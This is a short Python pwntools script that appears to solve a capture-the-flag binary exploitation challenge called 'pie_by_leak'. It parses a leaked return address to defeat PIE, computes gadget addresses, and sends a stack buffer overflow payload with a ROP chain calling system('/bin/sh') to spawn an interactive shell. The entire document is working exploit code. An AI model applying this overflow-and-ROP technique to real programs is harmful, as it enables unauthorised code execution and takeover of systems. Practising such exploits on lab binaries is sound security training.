from pwn import *
context.log_level = 'debug'
p = process('./pie_by_leak')
elf = ELF('./pie_by_leak')

system_base  = 0x1187
sh_base      = 0x2446
pop_rdi_base = 0x1193

p.recvuntil("> When the program segments fault again,\n")
p.recvline()
retaddr = int(p.recvline().split(b'0x')[1], 16)
log.success('retaddr: ' + str(hex(retaddr)))

base    = retaddr - 0x138C
system  = base + system_base
sh      = base + sh_base
pop_rdi = base + pop_rdi_base

payload = b'a'*(0x20+8)
payload += p64(pop_rdi) + p64(sh) + p64(system)

p.recvuntil('> best wish\n')
p.sendline(payload)
p.interactive()